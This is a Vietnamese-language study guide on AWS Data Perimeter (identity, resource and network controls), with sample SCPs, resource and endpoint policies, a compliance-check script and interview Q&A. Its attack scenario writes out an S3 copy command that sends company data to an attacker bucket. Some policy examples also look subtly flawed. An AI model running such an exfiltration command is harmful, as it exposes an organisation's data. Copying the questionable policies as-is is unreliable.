# 🔒 Data Perimeter — Vành Đai Dữ Liệu Trên AWS

> **Data Perimeter** (Vành Đai Dữ Liệu) là tập hợp các kiểm soát ngăn chặn truy cập dữ liệu của tổ chức từ **bên ngoài tổ chức** — dù credential bị lộ, dù attacker đã vào được AWS account, dữ liệu vẫn không thể bị exfiltrate (đánh cắp) ra ngoài. Đây là framework bảo vệ dữ liệu theo chiều sâu (defense-in-depth) của AWS.

---

## 📚 Mục Lục

1. [Khái Niệm Data Perimeter](#1-khái-niệm-data-perimeter)
2. [WHO: Kiểm Soát Định Danh Đáng Tin Cậy](#2-who-kiểm-soát-định-danh-đáng-tin-cậy)
3. [WHAT: Kiểm Soát Tài Nguyên Đáng Tin Cậy](#3-what-kiểm-soát-tài-nguyên-đáng-tin-cậy)
4. [WHERE: Kiểm Soát Mạng Đáng Tin Cậy](#4-where-kiểm-soát-mạng-đáng-tin-cậy)
5. [Bộ 4 Control Types](#5-bộ-4-control-types)
6. [SCP Examples Hoàn Chỉnh](#6-scp-examples-hoàn-chỉnh)
7. [Resource-Based Policy Examples](#7-resource-based-policy-examples)
8. [VPC Endpoint Policy Examples](#8-vpc-endpoint-policy-examples)
9. [Data Perimeter Cho Từng Service](#9-data-perimeter-cho-từng-service)
10. [AWS Data Perimeter Helper Tool](#10-aws-data-perimeter-helper-tool)
11. [Diagram Full Data Perimeter](#11-diagram-full-data-perimeter)
12. [Câu Hỏi Phỏng Vấn](#12-câu-hỏi-phỏng-vấn)
13. [Key Takeaways](#13-key-takeaways)

---

## 1. Khái Niệm Data Perimeter

### Tại Sao Cần Data Perimeter?

```
SCENARIO KHÔNG CÓ DATA PERIMETER:

1. Attacker steal credentials của developer Alice
2. Attacker assume role developer-role từ laptop của họ
3. Attacker run: aws s3 cp s3://company-secrets/ s3://attacker-bucket/
4. Dữ liệu bị exfiltrate thành công 😱

SCENARIO CÓ DATA PERIMETER:

1. Attacker steal credentials của Alice
2. Attacker try: aws s3 cp s3://company-secrets/ s3://attacker-bucket/
3. Resource policy check: aws:ResourceOrgID != org của attacker bucket
   → DENY — không thể copy sang bucket ngoài organization!
4. VPC Endpoint policy check: request từ mạng bên ngoài → DENY
5. Dữ liệu được bảo vệ dù credential bị lộ ✅
```

### 3 Chiều Của Data Perimeter

```
                    ┌─────────────────────────────┐
                    │       DATA PERIMETER         │
                    │                             │
  WHO  ─────────► │  Chỉ trusted identities     │
  (Ai truy cập?)   │  (principals trong Org)     │
                    │                             │
  WHAT ─────────► │  Chỉ trusted resources      │
  (Truy cập gì?)   │  (buckets, queues trong Org)│
                    │                             │
  WHERE ────────► │  Chỉ trusted networks       │
  (Từ đâu?)        │  (VPCs với endpoints)       │
                    │                             │
                    └─────────────────────────────┘

Kết hợp 3 chiều = attacker không thể exfiltrate data dù có credentials
```

### Data Perimeter vs Network Perimeter

| Tiêu Chí | Network Perimeter (Cũ) | Data Perimeter (Mới) |
|---|---|---|
| **Bảo vệ dựa trên** | IP address, CIDR | Identity (OrgID), Network (VPC) |
| **Hiệu quả với cloud** | Kém — không có "network boundary" rõ ràng | Tốt — theo organization boundary |
| **Chống insider threat** | Không — insider đã ở trong mạng | Có — kiểm tra OrgID của principal |
| **Chống credential theft** | Không — attacker dùng stolen credentials | Có — VPC Endpoint chặn từ bên ngoài |
| **AWS tools** | VPC Security Groups, NACLs | SCPs, Resource Policies, VPC Endpoint Policies |

---

## 2. WHO: Kiểm Soát Định Danh Đáng Tin Cậy

### Mục Tiêu

Chỉ **principals thuộc organization của bạn** mới được truy cập dữ liệu — ngăn chặn attacker dùng credential bị đánh cắp từ bên ngoài AWS account.

### Condition Key: `aws:PrincipalOrgID`

```
aws:PrincipalOrgID kiểm tra xem principal đang gửi request
có thuộc một AWS Organization cụ thể hay không.

Ví dụ:
  Principal: arn:aws:iam::123456789012:role/developer
  → Thuộc account 123456789012
  → Account này thuộc org o-xxxxxxxxxxxx
  → aws:PrincipalOrgID = "o-xxxxxxxxxxxx"
```

### Condition Key: `aws:PrincipalOrgPaths`

```
aws:PrincipalOrgPaths cho phép kiểm tra OU cụ thể:

Ví dụ:
  "aws:PrincipalOrgPaths": "o-xxxx/r-xxxx/ou-production/*"
  → Chỉ principals trong OU "production" mới được truy cập
```

### SCP Để Enforce WHO

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "EnforceIdentityPerimeter",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringNotEqualsIfExists": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        },
        "BoolIfExists": {
          "aws:PrincipalIsAWSService": "false"
        }
      }
    }
  ]
}
```

> **Lưu ý:** `BoolIfExists: aws:PrincipalIsAWSService: false` để không block AWS services (S3 replication, CloudFormation, etc.) vì chúng không có OrgID.

---

## 3. WHAT: Kiểm Soát Tài Nguyên Đáng Tin Cậy

### Mục Tiêu

Chỉ principals của bạn có thể **truy cập resources thuộc organization của bạn** — ngăn chặn người dùng trong org của bạn bị dụ dỗ gửi dữ liệu đến resource của attacker (confused deputy attack).

### Condition Key: `aws:ResourceOrgID`

```
aws:ResourceOrgID kiểm tra xem resource đang được truy cập
có thuộc một AWS Organization cụ thể không.

Ví dụ:
  aws s3 cp file.txt s3://attacker-bucket/
  → attacker-bucket thuộc account 999999999999
  → Account 999999999999 không thuộc org o-xxxxxxxxxxxx
  → aws:ResourceOrgID = "other-org" → DENY!
```

### SCP Để Enforce WHAT

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "EnforceResourcePerimeter",
      "Effect": "Deny",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:DeleteObject",
        "s3:CopyObject"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEqualsIfExists": {
          "aws:ResourceOrgID": "o-xxxxxxxxxxxx"
        }
      }
    }
  ]
}
```

### Ngoại Lệ Cho Third-Party Services

Một số legitimate third-party services cần truy cập (SIEM, backup tools):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyExternalS3WithExceptions",
      "Effect": "Deny",
      "Action": ["s3:PutObject", "s3:GetObject"],
      "Resource": "*",
      "Condition": {
        "StringNotEqualsIfExists": {
          "aws:ResourceOrgID": "o-xxxxxxxxxxxx",
          "aws:ResourceAccount": [
            "111111111111",
            "222222222222"
          ]
        }
      }
    }
  ]
}
```

---

## 4. WHERE: Kiểm Soát Mạng Đáng Tin Cậy

### Mục Tiêu

Chỉ các request xuất phát từ **mạng đáng tin cậy** (VPCs trong organization) mới được truy cập dữ liệu.

### Condition Keys Cho Network Perimeter

```
aws:SourceVpc    → VPC ID mà request đến từ
aws:SourceVpce   → VPC Endpoint ID mà request đi qua
aws:SourceIp     → IP address nguồn (cho requests trực tiếp)
aws:VpcSourceIp  → IP trong VPC (qua VPC Endpoint)
```

### VPC Endpoint Restriction

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyAccessFromOutsideTrustedVPCs",
      "Effect": "Deny",
      "Action": "s3:*",
      "Resource": "*",
      "Condition": {
        "StringNotEqualsIfExists": {
          "aws:SourceVpc": [
            "vpc-production-1a2b3c4d",
            "vpc-production-5e6f7g8h"
          ]
        },
        "Null": {
          "aws:SourceVpc": "false"
        }
      }
    }
  ]
}
```

> **Lưu ý quan trọng:** `Null: aws:SourceVpc: false` nghĩa là "chỉ áp dụng deny khi request ĐÃ đi qua VPC" — tránh block các service-to-service calls không qua VPC.

---

## 5. Bộ 4 Control Types

### Tổng Quan 4 Loại Controls

```
┌─────────────────────────────────────────────────────────────────┐
│                    4 CONTROL LAYERS                              │
│                                                                   │
│  1. SCPs (Service Control Policies)                              │
│     → Áp dụng cho TẤT CẢ principals trong Organization          │
│     → Prevent lẫn nhau, không thể override                      │
│     → Gắn vào: Root / OU / Account                              │
│                                                                   │
│  2. Resource-Based Policies                                      │
│     → Gắn trực tiếp vào S3 bucket, SQS queue, KMS key...        │
│     → Kiểm soát ai được truy cập resource đó                    │
│     → Hiệu quả cao vì áp dụng dù principal từ account nào       │
│                                                                   │
│  3. VPC Endpoint Policies                                        │
│     → Kiểm soát traffic đi qua VPC Endpoint                     │
│     → Chặn requests từ bên ngoài VPC trusted                    │
│     → Kết hợp với resource policy = double protection            │
│                                                                   │
│  4. Permission Boundaries                                        │
│     → Giới hạn quyền tối đa của IAM entity                     │
│     → Ngăn leo thang đặc quyền                                  │
│     → Phù hợp cho developer self-service IAM                    │
└─────────────────────────────────────────────────────────────────┘
```

### Khi Nào Dùng Loại Nào

| Control Type | Áp Dụng Cho | Strengths | Limitations |
|---|---|---|---|
| **SCP** | Toàn Org/OU/Account | Không thể override, centralized | Không áp dụng cho management account |
| **Resource Policy** | Từng resource cụ thể | Fine-grained, cross-account support | Phải áp dụng cho từng resource |
| **VPC Endpoint Policy** | Traffic qua endpoint | Network-level control | Chỉ áp dụng khi dùng endpoint |
| **Permission Boundary** | Từng IAM entity | Limit max permissions | Không thay thế identity policy |

---

## 6. SCP Examples Hoàn Chỉnh

### SCP Toàn Diện Cho Data Perimeter

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "P01EnforceIdentityPerimeter",
      "Effect": "Deny",
      "Action": [
        "s3:*",
        "sqs:*",
        "sns:*",
        "kms:*",
        "secretsmanager:*"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEqualsIfExists": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        },
        "BoolIfExists": {
          "aws:PrincipalIsAWSService": "false"
        }
      }
    },
    {
      "Sid": "P02EnforceResourcePerimeter",
      "Effect": "Deny",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:CopyObject",
        "s3:DeleteObject"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEqualsIfExists": {
          "aws:ResourceOrgID": "o-xxxxxxxxxxxx"
        }
      }
    },
    {
      "Sid": "P03EnforceNetworkPerimeter",
      "Effect": "Deny",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEqualsIfExists": {
          "aws:SourceVpce": [
            "vpce-s3-production",
            "vpce-s3-staging"
          ]
        },
        "Null": {
          "aws:SourceVpce": "false"
        },
        "Bool": {
          "aws:ViaAWSService": "false"
        }
      }
    }
  ]
}
```

### SCP Chống Exfiltration Qua EC2 Credentials

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PreventCredentialExfiltration",
      "Effect": "Deny",
      "Action": [
        "iam:CreateAccessKey",
        "iam:CreateUser",
        "iam:CreateLoginProfile"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:CalledViaFirst": [
            "cloudformation.amazonaws.com",
            "servicecatalog.amazonaws.com"
          ]
        }
      }
    }
  ]
}
```

---

## 7. Resource-Based Policy Examples

### S3 Bucket Policy Với Data Perimeter Đầy Đủ

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowOrgPrincipals",
      "Effect": "Allow",
      "Principal": "*",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:DeleteObject"
      ],
      "Resource": [
        "arn:aws:s3:::company-sensitive-data",
        "arn:aws:s3:::company-sensitive-data/*"
      ],
      "Condition": {
        "StringEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        }
      }
    },
    {
      "Sid": "DenyNonOrgPrincipals",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::company-sensitive-data",
        "arn:aws:s3:::company-sensitive-data/*"
      ],
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        },
        "BoolIfExists": {
          "aws:PrincipalIsAWSService": "false"
        }
      }
    },
    {
      "Sid": "DenyHTTP",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::company-sensitive-data",
        "arn:aws:s3:::company-sensitive-data/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    },
    {
      "Sid": "DenyFromOutsideVPC",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::company-sensitive-data",
        "arn:aws:s3:::company-sensitive-data/*"
      ],
      "Condition": {
        "StringNotEqualsIfExists": {
          "aws:SourceVpce": "vpce-xxxxxxxxxxxx"
        },
        "Null": {
          "aws:SourceVpce": "false"
        }
      }
    }
  ]
}
```

### KMS Key Policy Với Data Perimeter

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowOrgKeyUsage",
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": [
        "kms:Decrypt",
        "kms:GenerateDataKey",
        "kms:Encrypt"
      ],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        },
        "StringLike": {
          "kms:ViaService": [
            "s3.*.amazonaws.com",
            "secretsmanager.*.amazonaws.com"
          ]
        }
      }
    },
    {
      "Sid": "DenyKeyUsageFromOutsideOrg",
      "Effect": "Deny",
      "Principal": {
        "AWS": "*"
      },
      "Action": "kms:*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        },
        "BoolIfExists": {
          "aws:PrincipalIsAWSService": "false"
        }
      }
    }
  ]
}
```

---

## 8. VPC Endpoint Policy Examples

### VPC Endpoint Policy Cho S3 — Restrict To Org

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowOrgS3Access",
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::*",
        "arn:aws:s3:::*/*"
      ],
      "Condition": {
        "StringEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx",
          "aws:ResourceOrgID": "o-xxxxxxxxxxxx"
        }
      }
    },
    {
      "Sid": "DenyExternalDestinations",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:ResourceOrgID": "o-xxxxxxxxxxxx"
        }
      }
    }
  ]
}
```

```bash
# Tạo VPC Endpoint cho S3 với policy
aws ec2 create-vpc-endpoint \
  --vpc-id vpc-xxx \
  --service-name com.amazonaws.us-east-1.s3 \
  --vpc-endpoint-type Gateway \
  --route-table-ids rtb-xxx \
  --policy-document file://vpc-endpoint-s3-policy.json

# Sửa policy của endpoint hiện có
aws ec2 modify-vpc-endpoint \
  --vpc-endpoint-id vpce-xxx \
  --policy-document file://updated-policy.json
```

### VPC Endpoint Policy Cho Secrets Manager

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowSecretsManagerAccess",
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": [
        "secretsmanager:GetSecretValue",
        "secretsmanager:DescribeSecret"
      ],
      "Resource": "arn:aws:secretsmanager:*:*:secret:*",
      "Condition": {
        "StringEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx",
          "aws:ResourceAccount": [
            "123456789012",
            "234567890123"
          ]
        }
      }
    },
    {
      "Sid": "DenyCreateSecret",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "secretsmanager:CreateSecret",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        }
      }
    }
  ]
}
```

---

## 9. Data Perimeter Cho Từng Service

### SQS Queue Policy

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowOrgAccess",
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": [
        "sqs:SendMessage",
        "sqs:ReceiveMessage",
        "sqs:DeleteMessage"
      ],
      "Resource": "arn:aws:sqs:us-east-1:123456789012:my-queue",
      "Condition": {
        "StringEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        }
      }
    },
    {
      "Sid": "AllowSNSToSendMessages",
      "Effect": "Allow",
      "Principal": {
        "Service": "sns.amazonaws.com"
      },
      "Action": "sqs:SendMessage",
      "Resource": "arn:aws:sqs:us-east-1:123456789012:my-queue",
      "Condition": {
        "ArnLike": {
          "aws:SourceArn": "arn:aws:sns:us-east-1:123456789012:my-topic"
        },
        "StringEquals": {
          "aws:SourceAccount": "123456789012"
        }
      }
    }
  ]
}
```

### SNS Topic Policy

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowOrgPublish",
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": "sns:Publish",
      "Resource": "arn:aws:sns:us-east-1:123456789012:alerts-topic",
      "Condition": {
        "StringEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        }
      }
    },
    {
      "Sid": "DenyExternalSubscriptions",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "sns:Subscribe",
      "Resource": "arn:aws:sns:us-east-1:123456789012:alerts-topic",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxxxx"
        }
      }
    }
  ]
}
```

### Bảng Tổng Hợp Policy Theo Service

| Service | Resource Policy | VPC Endpoint Khuyến Nghị | Condition Keys Quan Trọng |
|---|---|---|---|
| **S3** | Bucket Policy | Gateway Endpoint | `aws:PrincipalOrgID`, `aws:ResourceOrgID`, `aws:SourceVpce` |
| **SQS** | Queue Policy | Interface Endpoint | `aws:PrincipalOrgID`, `aws:SourceVpc` |
| **SNS** | Topic Policy | Interface Endpoint | `aws:PrincipalOrgID` |
| **KMS** | Key Policy | Interface Endpoint | `aws:PrincipalOrgID`, `kms:ViaService` |
| **Secrets Manager** | Resource Policy | Interface Endpoint | `aws:PrincipalOrgID`, `aws:ResourceAccount` |
| **ECR** | Repository Policy | Interface Endpoint | `aws:PrincipalOrgID` |
| **Lambda** | Resource Policy | Interface Endpoint | `aws:PrincipalOrgID`, `aws:SourceAccount` |

---

## 10. AWS Data Perimeter Helper Tool

AWS cung cấp **data-perimeter-policy-examples** repository và **IAM Access Analyzer** để hỗ trợ triển khai Data Perimeter.

### IAM Access Analyzer — Phát Hiện External Access

```bash
# Tạo Access Analyzer cho toàn tổ chức
aws accessanalyzer create-analyzer \
  --analyzer-name "org-external-access-analyzer" \
  --type ORGANIZATION \
  --tags Key=purpose,Value=data-perimeter

# List findings (phát hiện external access)
aws accessanalyzer list-findings \
  --analyzer-arn arn:aws:access-analyzer:us-east-1:123456789012:analyzer/org-external-access-analyzer \
  --filter '{"resourceType": {"eq": ["AWS::S3::Bucket"]}}' \
  --query 'findings[?status==`ACTIVE`].[id,resource,principal]' \
  --output table

# Archive một finding (đã review, là expected)
aws accessanalyzer update-findings \
  --analyzer-arn arn:aws:access-analyzer:... \
  --ids finding-id-xxx \
  --status ARCHIVED
```

### Script Kiểm Tra Data Perimeter Compliance

```bash
#!/bin/bash
# check-data-perimeter.sh
# Kiểm tra S3 buckets có có policy data perimeter không

ORG_ID="o-xxxxxxxxxxxx"
REGION="us-east-1"
ISSUES=0

echo "=== Checking S3 Bucket Data Perimeter ==="

# Lấy danh sách bucket
BUCKETS=$(aws s3api list-buckets --query 'Buckets[].Name' --output text)

for BUCKET in $BUCKETS; do
  echo -n "Checking $BUCKET... "

  # Lấy bucket policy
  POLICY=$(aws s3api get-bucket-policy --bucket $BUCKET --query 'Policy' --output text 2>/dev/null)

  if [ -z "$POLICY" ]; then
    echo "❌ NO BUCKET POLICY — vulnerable to external access"
    ISSUES=$((ISSUES + 1))
    continue
  fi

  # Kiểm tra có PrincipalOrgID condition không
  if echo "$POLICY" | grep -q "PrincipalOrgID"; then
    echo "✅ Has PrincipalOrgID condition"
  else
    echo "⚠️  Missing PrincipalOrgID — check for public access"
    ISSUES=$((ISSUES + 1))
  fi
done

echo ""
echo "=== Summary ==="
echo "Total issues found: $ISSUES"
```

---

## 11. Diagram Full Data Perimeter

```
                     ╔════════════════════════════════════════╗
                     ║        AWS ORGANIZATION                 ║
                     ║        (o-xxxxxxxxxxxx)                ║
                     ║                                        ║
┌────────────────────╫──────────────────────────────────────╗ ║
│ ATTACKER           ║  Production Account                  ║ ║
│ (external)         ║                                      ║ ║
│                    ║  ┌──────────────────────────────┐   ║ ║
│  stolen creds      ║  │         VPC                  │   ║ ║
│  → try s3 cp       ║  │   ┌─────────────────────┐   │   ║ ║
│                    ║  │   │   EC2/Lambda App     │   │   ║ ║
│                    ║  │   └──────────┬──────────┘   │   ║ ║
│                    ║  │              │               │   ║ ║
│  ❌ Blocked by:    ║  │              ▼               │   ║ ║
│  1. VPC Endpoint   ║  │   ┌──────────────────────┐  │   ║ ║
│     policy         ║  │   │  S3 VPC Endpoint     │  │   ║ ║
│  (WHERE control)   ║  │   │  (Gateway Endpoint)  │  │   ║ ║
│                    ║  │   └──────────┬───────────┘  │   ║ ║
│                    ║  └─────────────────────────────┘   ║ ║
│                    ║                 │                   ║ ║
│                    ║                 ▼                   ║ ║
│  ❌ Blocked by:    ║  ┌──────────────────────────────┐  ║ ║
│  2. Resource Policy║  │    S3 Bucket                 │  ║ ║
│     (WHO: OrgID)   ║  │    Bucket Policy:            │  ║ ║
│                    ║  │    - Deny non-OrgID principal │  ║ ║
│                    ║  │    - Deny external resource   │  ║ ║
│  ❌ Blocked by:    ║  │    - Deny non-VPC access     │  ║ ║
│  3. SCP            ║  └──────────────────────────────┘  ║ ║
│     (WHO+WHAT)     ║                                     ║ ║
└────────────────────╫─────────────────────────────────────╝ ║
                     ║                                        ║
                     ║  ┌────────────────────────────────┐   ║
                     ║  │  SCP on OU/Account:            │   ║
                     ║  │  - Deny if PrincipalOrgID != X │   ║
                     ║  │  - Deny if ResourceOrgID != X  │   ║
                     ║  └────────────────────────────────┘   ║
                     ╚════════════════════════════════════════╝

DATA CÓ THỂ EXFILTRATE? ❌ Không — bị chặn bởi 3 layers độc lập
```

---

## 12. Câu Hỏi Phỏng Vấn

**Q1: Data Perimeter là gì và tại sao cần thiết?**

> Data Perimeter là tập hợp controls đảm bảo dữ liệu của tổ chức chỉ được truy cập bởi đúng định danh (WHO), truy cập đúng tài nguyên (WHAT), từ đúng mạng (WHERE). Cần thiết vì: khi credential bị đánh cắp, attacker có thể truy cập dữ liệu từ bên ngoài. Data Perimeter chặn điều này ở resource level và network level — dù có credential, vẫn không exfiltrate được.

**Q2: `aws:PrincipalOrgID` vs `aws:ResourceOrgID` khác nhau thế nào?**

> `aws:PrincipalOrgID` kiểm tra organization của **người gửi request** (principal). `aws:ResourceOrgID` kiểm tra organization của **resource đang được truy cập**. Trong Data Perimeter: dùng `PrincipalOrgID` để chỉ cho phép org member truy cập; dùng `ResourceOrgID` để ngăn principal của bạn gửi dữ liệu đến resource bên ngoài org.

**Q3: Tại sao cần cả 3 lớp kiểm soát (SCP + Resource Policy + VPC Endpoint Policy)?**

> Vì mỗi lớp bảo vệ một vector tấn công khác nhau: SCP chặn ở Org level (không thể override), Resource Policy bảo vệ kể cả khi SCP chưa cover hết hoặc từ cross-account access, VPC Endpoint Policy đảm bảo traffic phải đi qua mạng nội bộ. Kẻ tấn công cần phải bypass cả 3 lớp độc lập — defense-in-depth.

**Q4: `aws:SourceVpc` vs `aws:SourceVpce` khác nhau thế nào?**

> `aws:SourceVpc` kiểm tra VPC ID mà request đến từ (broad — toàn VPC). `aws:SourceVpce` kiểm tra VPC Endpoint ID cụ thể (narrow — chỉ qua endpoint đó). Dùng `aws:SourceVpce` khi muốn kiểm soát chặt hơn: chỉ qua endpoint cụ thể, không phải bất kỳ endpoint nào trong VPC.

**Q5: Làm thế nào xử lý exception cho AWS services như S3 replication, Lambda, CloudFormation?**

> AWS services gọi API thay mặt bạn thường có `aws:PrincipalIsAWSService: true`. Trong SCP Data Perimeter, thêm condition `BoolIfExists: aws:PrincipalIsAWSService: false` để chỉ apply deny cho NON-service principals. Ngoài ra, dùng `aws:SourceAccount` hoặc `aws:SourceArn` condition để whitelist specific AWS service calls.

**Q6: Sự khác biệt giữa Data Perimeter và Network Perimeter?**

> Network Perimeter kiểm soát traffic dựa trên IP/CIDR — trong cloud, không còn hiệu quả vì "internal" và "external" không rõ ràng. Data Perimeter kiểm soát dựa trên organizational identity (OrgID) và trusted network context (VPC Endpoint). Kẻ tấn công có thể giả mạo IP nhưng không thể giả mạo OrgID. Data Perimeter cũng bảo vệ khỏi insider threat khi credential bị đánh cắp.

---

## 13. Key Takeaways

> **3 chiều của Data Perimeter** (WHO, WHAT, WHERE) tương ứng với 3 vector exfiltration chính: stolen credentials từ bên ngoài (WHO), confused deputy attack (WHAT), và direct API calls ngoài VPC (WHERE).

> **`aws:PrincipalOrgID` là condition key quan trọng nhất** trong Data Perimeter — gắn vào mọi S3 bucket policy và resource-based policy quan trọng để chỉ cho phép org members truy cập.

> **VPC Endpoint + Endpoint Policy là "khoá cửa mạng"** — dữ liệu chỉ đi qua endpoint trong VPC tin cậy, không đi ra internet dù có credentials.

> **Defense-in-depth:** Không phụ thuộc một control duy nhất. SCP + Resource Policy + VPC Endpoint Policy tạo thành 3 lớp bảo vệ độc lập. Kẻ tấn công phải bypass cả 3.

> **AWS services cần whitelist đặc biệt** — nhiều AWS services (CloudFormation, S3 replication, Lambda) gọi API thay mặt bạn và không có OrgID. Cần dùng `aws:PrincipalIsAWSService` hoặc `aws:CalledVia` để tránh block legitimate service-to-service calls.
